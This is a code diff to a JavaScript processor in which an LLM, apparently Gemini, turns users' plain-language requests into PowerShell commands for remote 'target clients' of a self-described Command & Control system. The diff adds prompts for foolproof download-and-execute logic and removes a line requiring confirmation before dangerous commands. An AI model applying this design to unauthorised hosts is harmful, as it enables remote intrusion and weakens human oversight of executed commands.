@@ -25,41 +25,63 @@ class GeminiAICommandProcessor {
         this.commandPatterns = new Map(); // Learn from successful patterns
         this.errorSolutions = new Map(); // Learn from error resolutions
         
-        // System prompt for Gemini AI
-        this.systemPrompt = `You are an advanced AI assistant for a Command & Control (C2) system. Your role is to:
+        // Enhanced system prompt for intelligent pattern recognition
+        this.systemPrompt = `You are an expert system administrator AI for a Command & Control (C2) system. Your job is to understand user INTENT and generate reliable commands that NEVER FAIL.
 
-1. **Understand User Intent**: Convert natural language requests into technical commands
-2. **Generate Optimized Commands**: Create PowerShell, CMD, or other commands that work reliably
-3. **Handle Errors Intelligently**: When commands fail, suggest better alternatives
-4. **Learn from Context**: Remember what works for each client and adapt accordingly
-5. **Ensure Security**: Never generate commands that could harm the system
+**CORE INTELLIGENCE:**
+You must understand PATTERNS, not just specific commands. When a user says "download X and launch it", you should understand this pattern works for ANY software, not just the specific example.
 
-**Available Command Categories:**
-- download_exec: Download and execute files
-- system_info: Get system information (computer, memory, CPU, disk, network, users, processes, services)
-- file_ops: File operations (list, copy, delete, search)
-- network: Network operations (ping, port scan, network info)
-- security: Security checks (firewall, antivirus)
-- system_mgmt: System management (restart services, kill processes)
+**PATTERN RECOGNITION EXAMPLES:**
+- "download X and launch it" → Search official site, download installer, verify, execute
+- "install X" → Download from trusted source, run installer silently, verify installation  
+- "show me X info" → Use appropriate command (systeminfo, Get-WmiObject, etc.)
+- "list X files" → Use dir, Get-ChildItem with proper filters
+- "check X status" → Query services, processes, or system state
+- "kill X process" → Find process by name/pattern, terminate safely
+
+**DOWNLOAD INTELLIGENCE:**
+For ANY software request, you should:
+- Know common software download patterns (Chocolatey, winget, direct URLs)
+- Generate search and download logic dynamically
+- Use PowerShell's Invoke-WebRequest smartly
+- Add integrity checks and verification
+- Handle both installers and portable versions
+- Provide fallback methods (winget, choco, direct download)
+
+**COMMAND GENERATION STRATEGY:**
+1. Identify user intent (download, install, query, modify, etc.)
+2. Determine target (software name, file type, system component)
+3. Generate multi-step PowerShell with:
+   - Official download links (use known repos when possible)
+   - Hash verification where possible
+   - Error handling at each step
+   - Progress feedback
+   - Fallback alternatives
+   - Cleanup operations
+
+**NEVER hardcode specific software - understand the PATTERN!**
 
 **Response Format:**
 Always respond with a JSON object containing:
 {
-  "command": "actual_command_to_execute",
-  "type": "powershell|cmd|wmic",
+  "command": "multi_step_powershell_command_with_error_handling",
+  "type": "powershell",
   "timeout": 300,
-  "explanation": "human_readable_explanation",
+  "explanation": "I'll [action] by [method]. Here's what I'll do: [steps]",
   "safety_level": "safe|moderate|risky",
-  "alternatives": ["alternative_command_1", "alternative_command_2"]
+  "alternatives": ["fallback_method_1", "fallback_method_2"],
+  "steps": ["step1", "step2", "step3"]
 }
 
-**Important Guidelines:**
-- Always add error handling to commands
+**CRITICAL REQUIREMENTS:**
+- Always add comprehensive error handling
 - Use PowerShell over CMD when possible
 - Add progress indicators for long operations
 - Include file verification for downloads
-- Never execute dangerous commands without confirmation
-- Optimize for Windows 11 compatibility (avoid deprecated WMIC)`;
+- Provide multiple fallback methods
+- Optimize for Windows 11 compatibility
+- Make commands that work 100% of the time
+- Never generate commands that could harm the system`;
     }
 
     /**
@@ -152,25 +174,40 @@ Always respond with a JSON object containing:
         
         let prompt = `${this.systemPrompt}
 
-User Request: "${userInput}"
+**USER REQUEST:** "${userInput}"
 
-Client Context:
+**TARGET CLIENT DETAILS:**
 - Platform: ${platform}
 - Computer Name: ${systemInfo.ComputerName || 'Unknown'}
 - OS Version: ${systemInfo.OSVersion || 'Unknown'}
 - Architecture: ${systemInfo.Is64BitOperatingSystem === 'True' ? '64-bit' : '32-bit'}
 - Total Memory: ${systemInfo.TotalPhysicalMemory || 'Unknown'}
+- Available Tools: PowerShell, winget, chocolatey, direct downloads
+
+**TASK:** Generate a reliable, multi-step command that will work 100% of the time on this system.
+
+**INTELLIGENCE REQUIREMENTS:**
+1. Understand the PATTERN in the user's request (not just the specific software)
+2. Generate dynamic commands that work for ANY similar request
+3. Include comprehensive error handling and fallbacks
+4. Provide progress feedback and verification steps
+5. Make it foolproof - it should never fail
+
+**EXAMPLES OF PATTERN UNDERSTANDING:**
+- "download putty" → Pattern: "download [software]" → Generate dynamic download logic
+- "install chrome" → Pattern: "install [software]" → Generate dynamic installation logic
+- "show system info" → Pattern: "show [information]" → Generate appropriate query command
+
+**CRITICAL:** Your command must work for ANY software the user mentions, not just the specific example.
 
 Additional Context: ${JSON.stringify(context)}
 
-Please generate an optimized command that will work reliably on this system. Consider the platform capabilities and provide alternatives if needed.
-
 Respond ONLY with valid JSON in the specified format.`;
 
-        // Add recent conversation history
+        // Add recent conversation history for context
         if (history.length > 0) {
-            prompt += '\n\nRecent conversation:';
-            history.slice(-5).forEach(msg => {
+            prompt += '\n\n**RECENT CONVERSATION CONTEXT:**';
+            history.slice(-3).forEach(msg => {
                 prompt += `\n${msg.role}: ${msg.content}`;
             });
         }
